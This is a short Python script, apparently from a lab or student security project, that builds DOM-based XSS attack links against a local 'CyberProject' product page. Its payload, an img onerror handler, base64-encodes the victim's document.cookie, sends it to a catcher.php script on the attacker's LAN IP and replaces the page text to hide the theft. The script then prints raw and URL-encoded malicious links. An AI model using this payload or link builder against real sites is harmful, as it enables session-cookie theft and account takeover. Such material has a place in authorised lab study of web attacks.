# DOM-based XSS Attack Link Builder

import socket
import urllib.parse


def detect_lan_ip():
    # Open a UDP socket toward a public address. No packet is actually
    # sent (we never call sendto), but the OS picks the outbound
    # interface so getsockname() returns this machine's LAN IP.
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except OSError:
        return None
    finally:
        s.close()


VULNERABLE_SITE_IP = "localhost"
ATTACKER_IP = detect_lan_ip() or input("Could not auto-detect LAN IP. Enter attacker IP: ").strip()
TARGET_URL = f"http://{VULNERABLE_SITE_IP}/CyberProject/product_view.php?id=1"


payload = (
    f"<img src=x onerror=\""
    f"new Image().src='http://{ATTACKER_IP}/CyberProject/AttackerServer/catcher.php?data='+btoa(document.cookie);"
    f"this.parentNode.innerHTML='Pick a tab to see more details about this product.'"
    f"\">"
)

malicious_link = f"{TARGET_URL}#{payload}"
encoded_link   = f"{TARGET_URL}#{urllib.parse.quote(payload, safe='')}"

print("=" * 60)
print(f"[!] DOM XSS Payload Generated (Target: {VULNERABLE_SITE_IP})")
print("=" * 60)

print("\n--- Raw URL ---\n")
print(malicious_link)

print("\n--- Encoded URL ---\n")
print(encoded_link)

